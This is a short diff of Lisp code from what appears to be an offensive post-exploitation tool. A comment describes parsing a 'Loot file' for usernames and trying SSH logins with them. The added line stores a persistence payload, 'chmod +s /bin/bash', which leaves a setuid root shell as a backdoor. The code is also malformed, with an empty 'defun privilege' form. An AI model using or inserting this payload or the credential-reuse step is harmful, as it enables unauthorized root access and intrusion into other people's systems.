@@ -23,4 +23,4 @@
 (defvar callback  "") ;; Parse Loot file for username, try to ssh using it and notif on success
 
 (defun privilege)
-(defun privilege-persistence-payload "chmod +s /bin/bash")
+(defvar privilege-persistence-payload "chmod +s /bin/bash")
